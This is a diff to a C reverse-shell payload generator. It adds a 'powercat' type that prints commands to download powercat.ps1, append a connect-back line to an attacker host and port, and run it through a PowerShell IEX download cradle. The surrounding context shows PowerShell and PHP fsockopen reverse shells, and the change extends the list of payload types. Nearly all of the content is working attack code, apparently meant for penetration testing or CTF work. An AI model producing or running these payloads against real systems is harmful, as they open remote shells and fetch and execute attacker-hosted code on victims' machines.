@@ -49,6 +49,12 @@ int rev_shell(char* lhost,char* lport,char* type) {
         printf("echo \"Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s\" >> shell.ps1\n",lhost,lport);
         printf("\nPayload: powershell \"IEX(New-Object Net.WebClient).downloadString('http://%s/shell.ps1')\"\n",lhost);
     }
+    check = strcmp(type,"powercat");
+    if (check == 0){
+        printf("PS1:\nwget \"https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1\" -O shell.ps1\n");
+        printf("echo \"powercat -c %s -p %s -e cmd\" >> shell.ps1\n",lhost,lport);
+        printf("\nPayload: powershell \"IEX(New-Object Net.WebClient).downloadString('http://%s/shell.ps1')\"\n",lhost);
+    }
     check = strcmp(type,"php");
     if (check == 0){
         printf("PHP:\n<?php\n$sock=fsockopen(\"%s\",%s);\n$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n?>\n",lhost,lport);
@@ -83,7 +89,7 @@ int main(int argc, char* argv[]) {
         check_upgrade = strcmp(argv[1],"upgrades");
         if (check_types == 0){
         printf("Available types:\n");
-        printf("bash\nmkfifo\nnc\npowershell\npython\nphp\n");
+        printf("bash\nmkfifo\nnc\npowercat\npowershell\npython\nphp\nwindows\n");
         }
         else if (check_upgrade == 0){
         upgrade(argv[1],argv[2]);
